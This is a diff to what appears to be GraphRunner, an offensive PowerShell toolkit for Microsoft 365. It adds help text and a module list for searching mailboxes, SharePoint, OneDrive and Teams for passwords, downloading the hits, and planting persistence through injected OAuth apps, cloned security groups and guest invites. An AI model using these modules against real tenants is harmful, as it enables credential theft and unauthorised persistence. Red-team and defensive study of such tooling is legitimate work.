+    .PARAMETER PageResults
+
+        Enables paging to page through results
+
+    .EXAMPLE
+        
+        C:\PS> Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password" -MessageCount 40
+        -----------
+        This will search through the current user's mailbox for the term password.
+    #>
     param(
     [Parameter(Position = 0, Mandatory = $false)]
     [object[]]
@@ -2223,35 +2676,78 @@ Function Invoke-SearchMailbox{
 
 
 function Invoke-HTTPServer{
- param(
-    [Parameter(Position = 0, Mandatory = $false)]
-    [object[]]
-    $port = "8000"
-)
+    <#
+    .SYNOPSIS 
+    A basic web server to use for accessing the emailviewer.html file output from Invoke-SearchMailbox
+    #>
+    param(
+        [Parameter(Position = 0, Mandatory = $false)]
+        [object[]]
+        $port = "8000"
+    )
 
-$listener = New-Object System.Net.HttpListener
-$listener.Prefixes.Add("http://localhost:$port/")
-$listener.Start()
+    $listener = New-Object System.Net.HttpListener
+    $listener.Prefixes.Add("http://localhost:$port/")
+    $listener.Start()
 
-Write-Host "Listening for requests on http://localhost:$port/"
+    Write-Host "Listening for requests on http://localhost:$port/"
 
-while ($listener.IsListening) {
-     $context = $listener.GetContext()
-     $response = $context.Response
+    while ($listener.IsListening) {
+         $context = $listener.GetContext()
+         $response = $context.Response
 
-     $filename = $context.Request.Url.LocalPath.TrimStart('/')
-     $content = Get-Content -Path $filename -Raw
+         $filename = $context.Request.Url.LocalPath.TrimStart('/')
+         $content = Get-Content -Path $filename -Raw
 
-     $buffer = [System.Text.Encoding]::UTF8.GetBytes($content)
-     $response.ContentLength64 = $buffer.Length
-     $response.OutputStream.Write($buffer, 0, $buffer.Length)
-     $response.OutputStream.Close()
-}
+         $buffer = [System.Text.Encoding]::UTF8.GetBytes($content)
+         $response.ContentLength64 = $buffer.Length
+         $response.OutputStream.Write($buffer, 0, $buffer.Length)
+         $response.OutputStream.Close()
+    }
 
 }
 
 
 function Invoke-SearchSharePointAndOneDrive{
+    <#
+    .SYNOPSIS
+
+        This module uses the Graph search API to search for specific terms in all SharePoint and OneDrive drives available to the logged in user. It prompts the user which files they want to download.   
+        Author: Beau Bullock (@dafthack)
+        License: MIT
+        Required Dependencies: None
+        Optional Dependencies: None
+
+    .DESCRIPTION
+        
+       This module uses the Graph search API to search for specific terms in all SharePoint and OneDrive drives available to the logged in user. It prompts the user which files they want to download.
+
+    .PARAMETER Tokens
+
+        Pass the $tokens global variable after authenticating to this parameter
+
+    .PARAMETER SearchTerm
+
+         The term you want to search for. This accepts KQL queries so you can use terms like "filetype", "content", and more.
+
+    .PARAMETER ResultCount
+
+        The amount of files returned in the search results (default = 25)
+
+    .PARAMETER OutFile
+
+        File to output a list of hits to
+
+    .PARAMETER PageResults
+
+        Using paging it will return all possible results for a search term
+
+    .EXAMPLE
+        
+        C:\PS> Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm 'password filetype:xlsx'
+        -----------
+        This will search through the all SharePoint and OneDrive drives accessible to the current user for the term password.
+    #>
     param(
     [Parameter(Position = 0, Mandatory = $false)]
     [object[]]
@@ -2461,6 +2957,37 @@ function Invoke-SearchSharePointAndOneDrive{
 }
 
 function Invoke-DriveFileDownload{
+    <#
+        .SYNOPSIS
+
+        If you want to download individual files from SharePoint and OneDrive you can use the DriveID & ItemID output with the Invoke-SearchSharePointAndOneDrive module.   
+        Author: Beau Bullock (@dafthack)
+        License: MIT
+        Required Dependencies: None
+        Optional Dependencies: None
+
+    .DESCRIPTION
+        
+        If you want to download individual files from SharePoint and OneDrive you can use the DriveID & ItemID output with the Invoke-SearchSharePointAndOneDrive module.
+
+    .PARAMETER Tokens
+
+        Pass the $tokens global variable after authenticating to this parameter
+
+    .PARAMETER DriveItemIDs
+
+        A combined value of the drive ID and item ID separated by a colon like this: "b!wDDN4DNGFFufSAEEN8TO3FEfeD9gdE3fm2O_-kGSapywefT_je-ghthhilmtycsZ\:01AVEVEP23EJ43DPEVEGEF7IZ6YEFEF222"
+
+    .PARAMETER FileName
+
+        The filename you want to download the file to
+
+    .EXAMPLE
+        
+        C:\PS> Invoke-DriveFileDownload -Tokens $tokens -FileName "Passwords.docx" -DriveItemIDs "b!wDDN4DNGFFufSAEEN8TO3FEfeD9gdE3fm2O_-kGSapywefT_je-ghthhilmtycsZ\:01AVEVEP23EJ43DPEVEGEF7IZ6YEFEF222"
+        -----------
+        This will download a single file from the drive specified.
+    #>
     param(
     [Parameter(Position = 0, Mandatory = $false)]
     [object[]]
@@ -2484,6 +3011,41 @@ function Invoke-DriveFileDownload{
 
 
 function Invoke-SearchTeams{
+    <#
+        .SYNOPSIS
+
+        This module uses the Substrate search API to search for specific terms in Teams channels visible to the logged in user.   
+        Author: Beau Bullock (@dafthack)
+        License: MIT
+        Required Dependencies: None
+        Optional Dependencies: None
+
+    .DESCRIPTION
+        
+        This module uses the Substrate search API to search for specific terms in Teams channels visible to the logged in user.
+
+    .PARAMETER Tokens
+
+        Pass the $tokens global variable after authenticating to this parameter
+
+    .PARAMETER SearchTerm
+
+        The term you want to search for in Teams messages
+
+    .PARAMETER ResultSize
+
+        The amount of messages returned in the search results (default = 50)
+
+    .PARAMETER OutFile
+
+        File to output the results of the search to
+
+    .EXAMPLE
+        
+        C:\PS> Invoke-SearchTeams -Tokens $tokens -SearchTerm "password" -ResultSize 100
+        -----------
+        This searches all Teams messages in all channels visible to the current user for the term password.
+    #>
     param(
     [Parameter(Position = 0, Mandatory = $false)]
     [object[]]
@@ -2693,8 +3255,35 @@ function Invoke-SearchTeams{
 
 
 function Invoke-GraphRunner{
+    <#
+    .SYNOPSIS
 
-param(
+        Runs Invoke-GraphRecon, Get-AzureADUsers, Get-SecurityGroups, Invoke-DumpCAPS, Invoke-DumpApps, and then uses the default_detectors.json file to search with Invoke-SearchMailbox, Invoke-SearchSharePointAndOneDrive, and Invoke-SearchTeams.  
+        Author: Beau Bullock (@dafthack)
+        License: MIT
+        Required Dependencies: None
+        Optional Dependencies: None
+
+    .DESCRIPTION
+        
+        Runs Invoke-GraphRecon, Get-AzureADUsers, Get-SecurityGroups, Invoke-DumpCAPS, Invoke-DumpApps, and then uses the default_detectors.json file to search with Invoke-SearchMailbox, Invoke-SearchSharePointAndOneDrive, and Invoke-SearchTeams.
+
+    .PARAMETER Tokens
+
+        Pass the $tokens global variable after authenticating to this parameter
+
+    .PARAMETER DetectorFile
+
+        A json file containing KQL queries. See the default_detectors.json file in the repo as an example.
+
+    .EXAMPLE
+        
+        C:\PS> Invoke-GraphRunner -Tokens $tokens
+        -----------
+        Runs through the account with many of the enumeration and pillage modules using the default_detectors.json file.
+    #>
+
+    param(
     [Parameter(Position = 0, Mandatory = $false)]
     [object[]]
     $Tokens = "",
@@ -2780,4 +3369,58 @@ param(
 
 
     Write-Host -ForegroundColor yellow "[*] Results have been written to $folderName"
+}
+
+
+
+function List-GraphRunnerModules{
+    <#
+    .SYNOPSIS 
+    A module to list all of the GraphRunner modules
+    #>
+
+    Write-Host -foregroundcolor green "[*] Listing GraphRunner modules..."
+
+    Write-Host -ForegroundColor green "-------------------- Authentication Modules -------------------"
+    Write-Host -ForegroundColor green "`tMODULE`t`t`t-`t DESCRIPTION"
+    Write-Host -ForegroundColor green "Get-GraphTokens`t`t`t-`t Authenticate as a user to Microsoft Graph
+Invoke-RefreshGraphTokens`t-`t Use a refresh token to obtain new access tokens
+Get-AzureAppTokens`t`t-`t Complete OAuth flow as an app to obtain access tokens
+Invoke-RefreshAzureAppTokens`t-`t Use a refresh token and app credentials to refresh a token
+Invoke-AutoOAuthFlow`t`t-`t Automates OAuth flow by standing up a web server and listening for auth code
+Invoke-CheckAcces`t`t-`t Check if tokens are valid
+    "
+    Write-Host -ForegroundColor green "----------------- Recon & Enumeration Modules -----------------"
+    Write-Host -ForegroundColor green "`tMODULE`t`t`t-`t DESCRIPTION"
+    Write-Host -ForegroundColor green "Invoke-GraphRecon`t`t-`t Performs general recon for org info, user settings, directory sync settings, etc
+Invoke-DumpCAPS`t`t`t-`t Gets conditional access policies
+Invoke-DumpApps`t`t`t-`t Gets app registrations and external enterprise apps along with consent and scope info
+Get-AzureADUsers`t`t-`t Gets user directory
+Get-SecurityGroups`t`t-`t Gets security groups and members
+Invoke-GraphOpenInboxFinder`t-`t Checks each user’s inbox in a list to see if they are readable
+    "
+    Write-Host -ForegroundColor green "--------------------- Persistence Modules ---------------------"
+    Write-Host -ForegroundColor green "`tMODULE`t`t`t-`t DESCRIPTION"
+    Write-Host -ForegroundColor green "Invoke-InjectOAuthApp`t`t-`t Injects an app registration into the tenant
+Invoke-SecurityGroupCloner`t-`t Clones a security group while using an identical name and member list but can inject another user as well
+Invoke-InviteGuest`t`t-`t Invites a guest user to the tenant
+Invoke-DeleteOAuthApp`t`t-`t Delete an OAuth App
+    "
+    Write-Host -ForegroundColor green "----------------------- Pillage Modules -----------------------"
+    Write-Host -ForegroundColor green "`tMODULE`t`t`t-`t DESCRIPTION"
+    Write-Host -ForegroundColor green "Invoke-SearchSharePointAndOneDrive -`t Search across all SharePoint sites and OneDrive drives visible to the user
+Invoke-SearchMailbox`t`t-`t Has the ability to do deep searches across a user’s mailbox and can export messages
+Invoke-SearchTeams`t`t-`t Can search all Teams messages in all channels that are readable by the current user.
+Invoke-SearchUserAttributes`t-`t Search for terms across all user attributes in a directory
+Get-Inbox`t`t`t-`t Gets inbox items
+    "
+    Write-Host -ForegroundColor green "--------------------- GraphRunner Module ----------------------"
+    Write-Host -ForegroundColor green "`tMODULE`t`t`t-`t DESCRIPTION"
+    Write-Host -ForegroundColor green "Invoke-GraphRunner`t`t- Runs Invoke-GraphRecon, Get-AzureADUsers, Get-SecurityGroups, Invoke-DumpCAPS, Invoke-DumpApps, and then uses the default_detectors.json file to search with Invoke-SearchMailbox, Invoke-SearchSharePointAndOneDrive, and Invoke-SearchTeams."
+
+    Write-Host -ForegroundColor green ("=" * 80)
+
+    Write-Host -ForegroundColor green '[*] For help with individual modules run Get-Help <module name> -detailed'
+    Write-Host -ForegroundColor green '[*] Example: Get-Help Invoke-InjectOAuthApp -detailed'
+
 }
